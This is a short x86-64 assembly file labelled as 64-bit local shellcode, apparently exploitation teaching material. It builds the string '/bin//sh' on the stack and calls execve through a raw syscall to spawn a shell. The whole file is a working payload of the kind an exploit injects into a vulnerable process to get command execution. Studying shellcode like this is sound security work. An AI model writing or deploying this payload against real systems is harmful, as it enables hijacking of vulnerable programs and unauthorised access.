	;; 021813
	;; Evan Jensen 64bit localshellcode
	;; RDI, RSI, RDX, RCX, R8, and R9 then stack		
BITS 64
global main
	extern execve
main:
	xor rax,rax
	push rax
	mov rdi, 0x68732f2f6e69622f
	push rdi
	mov al,59 		;execve in unistd_64.h
	mov rdi,rsp
	xor rsi,rsi
	xor rdx,rdx
	syscall

